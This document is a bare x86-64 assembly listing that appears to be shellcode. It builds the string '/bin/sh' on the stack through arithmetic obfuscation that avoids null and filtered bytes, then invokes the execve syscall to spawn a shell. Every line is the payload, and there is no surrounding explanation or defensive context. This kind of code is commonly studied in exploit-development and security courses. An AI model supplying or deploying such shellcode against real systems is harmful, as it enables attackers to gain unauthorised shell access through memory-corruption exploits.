```assembly
mov    r11d,0xfffffff1
sub    r11d,0xffffff89
xor    r9,r9
or     r9,r11         ; 0x00 0x68
shl    r9,0xf
shl    r9,1
mov    r11d,0xffffff11
sub    r11d,0xffff8be1
dec    r11d
or     r9,r11         ; 0x73 0x2f
shl    r9,0xf
shl    r9,1
mov    r11d,0xfffffff1
sub    r11d,0xffff9187
dec    r11d
or     r9,r11         ; 0x6e 0x69
shl    r9,0xf
shl    r9,1
mov    r11d,0xfffffff1
sub    r11d,0xffff9dc1
dec    r11d
or     r9,r11         ; 0x62 0x2f
push   r9

xor    r9,r9
or     r9,rsp
push   r9
pop    rdi

xor    ecx,ecx
movzx  edx,cx
movzx  esi,cx
lea    eax,[ecx+0x3b]
syscall
```
